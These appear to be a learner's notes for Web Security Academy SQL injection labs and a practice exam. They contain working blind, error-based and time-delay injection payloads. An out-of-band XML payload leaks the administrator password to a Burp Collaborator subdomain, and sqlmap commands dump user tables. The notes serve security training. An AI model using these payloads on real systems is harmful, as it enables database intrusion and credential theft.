## Blind SQL

```

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a (This will allow you to verify if there is an existing table users

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

```

This will allow you to verify if administrator is existing or other users

```

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

This will allow you to discover the lenght of the password you want to find
```

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

This query you could use it in the burp intruder section and use the cluster bomb to fill the two payloads 

Burp Intruder / Cluster Bomb
----------------------------------------------------------------------------------------


## Blind SQL conditional error
```

TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

WHERE ROWNUM = 1 helps us to prevent the concatenation because it allow just one row

TO verify the conditional error use 
```

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (Error)

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ' ' END FROM dual)||'; (No error)

If the query exist will return an error if not it will return the normal page without error

Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||';
Cookie: TrackingId=qdc4zTxTf4JsJ7Xr' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')||'; 

To verify if the password is much longer than 20 characters (if not, the error persist)

## Final Sample
Cookie: TrackingId=I4NKwCxmsqWtTKVz'UNION 	SELECT CASE WHEN SUBSTR(password,ยง1ยง,1)='ยงaยง' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'--; 
```

TIME DELAY INFORMATION RETRIVAL

%3B = ;
```

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--;

TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

Cookie: TrackingId=0Ba7ypaGtaQgRN6o'%3B SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--;

in case of timing set concurrent requests to 1
```
```

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```

If you want to exfiltrate datas

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

The password will apper in the subdomain of the request

## If you find a field to exploit you can try with sql-map:

(1)
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --batch

(2) - Get Databases
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" --dbs --batch

(3) - Get Tables
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public --tables --batch

(4) - Dump Specific Table
python sqlmap.py -u "https://<CHANGE_HERE>.web-security-academy.net/advancedsearch?find=test&organize_by=*&writer=" --cookie="_lab=<CHANGE_HERE>;session=<CHANGE_HERE>" -D public -T users --dump --batch

Sometimes work, sometimes not, you can try meanwhile manual SQLi


Other samples with sqlMap (to velocize when it's possible the stages in the exam):

--batch (will set all the default option)
--dump (will Dump DBMS database table entries )

Here the injection it's in the cookie:
THIS WILL RETRIVE THE TABLES
python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public --tables --batch

ONCE YOU HAVE THE TABLE YOU CAN TRY FOR THE USERS

python3.9 sqlmap.py -u "https://0a35006a04c116cec0d6690d00ec00b2.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=rPCbIvsmAYOBn0Wi*; session=WuxknuiWqniE8VFoSyQkFo1tuDSJDoEJ" -p 'TrackingId' -D public -T users --dump --batch


PRACTICE EXAM, my solution:

## ENUMERATE THE VERSION
python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' --dbs --batch -v

## ENUMERATE THE TABLES

python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' -D public -tables --batch -v

## ENUMERATES THE PASWORD AND USER

python3.9 sqlmap.py -u "https://0a32001904420f6dc0059ff0002300f4.web-security-academy.net/filtered_search?SearchTerm=tst&sort-by=DATE*&writer=" --cookie="_lab=46%7cMCwCFDqshnAzLn7gITAPfnZeXeccYtxdAhQd6xB0D%2fBA001dt4duYLSFbMxc5BW2VB9cwXUuIoYxZ60wq9uskzfgPcZk%2fpGOO0Zxk%2bQALctqFAhKVhoVm%2bVFZ3W9FdUPCtOcu%2fOch0F2DhlDknhe%2by2L0IKTYPnXHHydUIiUkqL5tTg%3d; session=KMLJMhhEZ3HYIVpTftlMNO99rMdYtQyq" -p 'sort-by' -D public -T users --dump --batch -v


another way to perform an sqlmap attack, it's saving the request intercepted by BurpSuite with the option "save item" and run this command

```

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump --dbs --batch 

sqlmap -r request --level=5 --risk=3 -p 'sort-by' -D public -tables --batch -v

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump -D {database, usually public} -T {table, usually user}

sqlmap -r request --level=5 --risk=3 --batch -p '{your parameter}' --dump -D {database, usually public} -T {table, usually user}
```

man page to avoid multiple windows
"
Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner user"
